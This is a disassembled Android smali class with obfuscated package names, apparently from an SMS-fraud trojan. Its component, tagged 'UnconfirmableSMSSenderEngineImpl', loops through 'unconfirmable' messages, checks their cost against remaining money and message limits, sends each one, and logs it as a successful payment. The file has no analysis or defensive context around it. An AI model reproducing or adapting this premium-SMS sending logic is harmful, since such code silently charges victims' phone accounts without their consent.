.class public Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a2007fad8/ae26bc53f;
.super Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/ad126a8fc;
.source "avXnRkTmL.java"

# interfaces
.implements Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a7c41d4fa/a6c80dd6e;


# static fields
.field private static final tag:Ljava/lang/String; = "UnconfirmableSMSSenderEngineImpl"


# instance fields
.field private context:Landroid/content/Context;

.field private final data:Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;

.field limits:Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/ab7a95c65;

.field private nextID:I


# direct methods
.method public constructor <init>(Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;Landroid/content/SharedPreferences;Landroid/content/Context;)V
    .locals 2

    invoke-direct {p0}, Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/ad126a8fc;-><init>()V

    iput-object p1, p0, Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a2007fad8/ae26bc53f;->data:Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;

    iput-object p3, p0, Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a2007fad8/ae26bc53f;->context:Landroid/content/Context;

    const-string v0, "UnconfirmableSMSSenderEngineImpl"

    const-string v1, "C-tor"

    invoke-static {v0, v1}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method


# virtual methods
.method public canSendMoreMessages()Z
    .locals 6

    const/4 v2, 0x1

    const/4 v3, 0x0

    :goto_0
    iget v4, p0, Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a2007fad8/ae26bc53f;->nextID:I

    iget-object v5, p0, Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a2007fad8/ae26bc53f;->data:Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;

    invoke-virtual {v5}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;->getUnconfirmableSmsCount()I

    move-result v5

    if-ge v4, v5, :cond_0

    iget-object v4, p0, Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a2007fad8/ae26bc53f;->data:Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;

    iget v5, p0, Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a2007fad8/ae26bc53f;->nextID:I

    invoke-virtual {v4, v5}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;->getUnconfirmableSMS(I)Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e$a4cecb21b;

    move-result-object v4

    invoke-virtual {v4}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e$a4cecb21b;->getCost()I

    move-result v4

    iget-object v5, p0, Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a2007fad8/ae26bc53f;->limits:Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/ab7a95c65;

    invoke-virtual {v5}, Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/ab7a95c65;->expectedMoneyRest()I

    move-result v5

    if-le v4, v5, :cond_0

    iget v4, p0, Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a2007fad8/ae26bc53f;->nextID:I

    add-int/lit8 v4, v4, 0x1

    iput v4, p0, Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a2007fad8/ae26bc53f;->nextID:I

    goto :goto_0

    :cond_0
    iget v4, p0, Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a2007fad8/ae26bc53f;->nextID:I

    iget-object v5, p0, Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a2007fad8/ae26bc53f;->data:Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;

    invoke-virtual {v5}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;->getUnconfirmableSmsCount()I

    move-result v5

    if-ge v4, v5, :cond_1

    move v1, v2

    :goto_1
    iget-object v4, p0, Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a2007fad8/ae26bc53f;->limits:Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/ab7a95c65;

    invoke-virtual {v4}, Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/ab7a95c65;->smsCountRest()I

    move-result v4

    if-lez v4, :cond_2

    move v0, v2

    :goto_2
    if-eqz v1, :cond_3

    if-eqz v0, :cond_3

    :goto_3
    return v2

    :cond_1
    move v1, v3

    goto :goto_1

    :cond_2
    move v0, v3

    goto :goto_2

    :cond_3
    move v2, v3

    goto :goto_3
.end method

.method public init(Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/ab7a95c65;)V
    .locals 1

    iput-object p1, p0, Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a2007fad8/ae26bc53f;->limits:Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/ab7a95c65;

    const/4 v0, 0x0

    iput v0, p0, Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a2007fad8/ae26bc53f;->nextID:I

    return-void
.end method

.method public sendOneMessage()V
    .locals 3

    invoke-virtual {p0}, Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a2007fad8/ae26bc53f;->canSendMoreMessages()Z

    move-result v1

    if-nez v1, :cond_0

    :goto_0
    return-void

    :cond_0
    iget-object v1, p0, Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a2007fad8/ae26bc53f;->data:Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;

    iget v2, p0, Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a2007fad8/ae26bc53f;->nextID:I

    invoke-virtual {v1, v2}, Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e;->getUnconfirmableSMS(I)Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e$a4cecb21b;

    move-result-object v0

    iget-object v1, p0, Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a2007fad8/ae26bc53f;->context:Landroid/content/Context;

    invoke-virtual {p0, v1, v0}, Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a2007fad8/ae26bc53f;->SendMessage(Landroid/content/Context;Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e$a4cecb21b;)V

    iget-object v1, p0, Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a2007fad8/ae26bc53f;->limits:Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/ab7a95c65;

    invoke-virtual {v1, v0}, Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/ab7a95c65;->registerSuccessfulPayment(Lcom/adc58a797/ac31b3236/a740675ee/aa74ad8df/aed35570e$a4cecb21b;)V

    iget v1, p0, Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a2007fad8/ae26bc53f;->nextID:I

    add-int/lit8 v1, v1, 0x1

    iput v1, p0, Lcom/adc58a797/ac31b3236/a740675ee/a18b43c6a/a2007fad8/ae26bc53f;->nextID:I

    goto :goto_0
.end method
